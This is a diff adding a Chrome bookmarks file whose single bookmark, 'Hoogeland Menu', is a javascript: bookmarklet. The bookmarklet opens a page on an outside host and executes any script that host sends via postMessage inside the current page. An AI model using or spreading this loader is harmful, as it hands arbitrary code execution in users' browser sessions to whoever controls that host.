@@ -1,0 +1,47 @@
+{
+   "checksum": "fcb66c6ffbeb5f7e815c72cbeb97b22c",
+   "roots": {
+      "bookmark_bar": {
+         "children": [ {
+            "date_added": "13314128860040221",
+            "date_last_used": "0",
+            "guid": "02575e7f-e383-4d30-b75f-ea76a13f1574",
+            "id": "5",
+            "meta_info": {
+               "power_bookmark_meta": ""
+            },
+            "name": "Hoogeland Menu",
+            "type": "url",
+            "url": "javascript:win = open('https://pages.dazerstudios.ga/Hoogeland-Menu', '', 'height=500, width=500'); window.addEventListener('message', function(event) { if(event.origin != 'https://pages.dazerstudios.ga' || typeof event.data != 'string') return; let script = document.createElement('script'); script.innerText = event.data; document.body.appendChild(script); script.remove()});"
+         } ],
+         "date_added": "13314128821897499",
+         "date_last_used": "0",
+         "date_modified": "13314128860040249",
+         "guid": "0bc5d13f-2cba-5d74-951f-3f233fe6c908",
+         "id": "1",
+         "name": "Bookmarks",
+         "type": "folder"
+      },
+      "other": {
+         "children": [  ],
+         "date_added": "13314128821897502",
+         "date_last_used": "0",
+         "date_modified": "0",
+         "guid": "82b081ec-3dd3-529c-8475-ab6c344590dd",
+         "id": "2",
+         "name": "Other bookmarks",
+         "type": "folder"
+      },
+      "synced": {
+         "children": [  ],
+         "date_added": "13314128821897504",
+         "date_last_used": "0",
+         "date_modified": "0",
+         "guid": "4cf2e351-0e85-532b-bb37-df045d8f8d0f",
+         "id": "3",
+         "name": "Mobile bookmarks",
+         "type": "folder"
+      }
+   },
+   "version": 1
+}
